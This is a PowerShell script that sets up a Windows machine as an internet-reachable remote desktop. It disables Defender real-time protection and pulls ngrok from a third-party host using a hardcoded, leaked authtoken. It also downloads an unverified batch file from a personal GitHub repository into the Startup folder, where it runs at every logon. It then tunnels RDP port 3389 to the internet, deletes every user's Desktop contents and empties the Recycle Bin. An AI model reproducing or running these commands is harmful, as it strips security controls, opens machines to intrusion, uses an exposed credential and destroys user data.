# Hiding download process bar and bypassing security protocols
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

# Disabling Defender Real-Time
Set-MpPreference -DisableRealtimeMonitoring $true

# Function to unpin apps from the Start menu
function Unpin-Apps {
    param (
        [string]$startMenuPath
    )

    # Get a list of all the shortcut files in the Start menu
    $shortcuts = Get-ChildItem -Path $startMenuPath -Recurse -Filter *.lnk

    foreach ($shortcut in $shortcuts) {
        try {
            # Remove the shortcut to unpin it
            Remove-Item -Path $shortcut.FullName -Force
            Write-Host "Unpinned $($shortcut.FullName)"
        } catch {
            Write-Host "Error unpinning $($shortcut.FullName): $_"
        }
    }
}

# Unpin apps from the current user's Start menu
Unpin-Apps -startMenuPath "$env:APPDATA\Microsoft\Windows\Start Menu"

# Unpin apps from the all users' Start menu
Unpin-Apps -startMenuPath "$env:ProgramData\Microsoft\Windows\Start Menu"

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{ESC}')
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait('^{ESC}')
Start-Sleep -Milliseconds 500

# Enabling Audio
Write-Host "Enabling Audio"
Set-Service -Name Audiosrv -StartupType Automatic | Out-Null
Start-Service -Name "AudioSrv"


# Starting RDP tunnel
Write-Host "Starting RDP tunnel"
Invoke-WebRequest -Uri "https://cloudfalls.vercel.app/api/raw/?path=/Downloads/ngrok-v3-stable-windows-amd64.zip" -OutFile "C:\ngrok.zip" | Out-Null
New-Item -ItemType Directory -Path "C:\ngrok" -Force | Out-Null
Expand-Archive -Path "C:\ngrok.zip" -DestinationPath "C:\ngrok" -Force | Out-Null
Start-Process -FilePath "C:\ngrok\ngrok.exe" -ArgumentList "authtoken", "2aT33hJD0ZrQ8Yq6YwlmxLBEszF_6QXAJiT84FURe7hdMKMDe" -Wait | Out-Null
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UwU990099/myfiles/main/ngrok_startup.bat" -OutFile "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ngrok_startup.bat" | Out-Null
Start-Process -FilePath "C:\ngrok\ngrok.exe" -ArgumentList "tcp", "--region", "ap", "3389"
Remove-Item -Path "C:\ngrok.zip" -Force 

# Customizing desktop shortcuts
Write-Host "Customizing desktop shortcuts"
$desktopPath = "Desktop"
$userProfiles = Get-ChildItem -Path "C:\Users\" -Directory
foreach ($userProfile in $userProfiles) {
    $userDesktopPath = Join-Path -Path $userProfile.FullName -ChildPath $desktopPath
    Remove-Item -Path $userDesktopPath\* -Force -Recurse -Confirm:$false
}
Clear-RecycleBin -Force | Out-Null

# Opening visual effects window
SystemPropertiesPerformance.exe

# Add this computer
$computerRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
$computerIconValueName = "{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
$defaultValue = 0
New-Item -Path $computerRegistryPath -Force | Out-Null
Set-ItemProperty -Path $computerRegistryPath -Name $computerIconValueName -Value $defaultValue

Stop-Process -Name explorer -Force
